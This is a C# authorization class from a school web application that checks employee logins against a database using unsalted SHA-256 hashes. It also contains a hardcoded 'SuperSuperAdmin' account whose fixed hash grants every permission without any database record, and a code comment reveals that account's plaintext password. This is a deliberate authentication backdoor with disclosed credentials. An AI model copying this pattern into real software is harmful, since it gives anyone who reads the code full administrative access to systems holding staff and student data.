using SchoolWeb.Model;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;

namespace SchoolWeb.App_Code
{
     public class AuthorizationManager
     {
         public static Employee AuthorizeEmployee(string UserName,string Password)
         {
            Employee employee = null;
            Password = Helper.HashSHA256(Password);
            using(SchoolDBEntities db=new SchoolDBEntities())
            {
                employee=db.Employee.Where(x => x.Username == UserName && x.Password == Password).FirstOrDefault();
            }
            if(UserName=="SuperSuperAdmin"&& Password == "1886B14C35EF70E25F353A03EBD2481437ACADD59B0FA2342916576687087D20")//password Admin1Super2Pass3
            {
                employee = new Employee()
                {
                    FirstName = "Admin",
                    Permission = PermissionManager.GetAll(),
                };
            }
            return employee;
         }
     }
}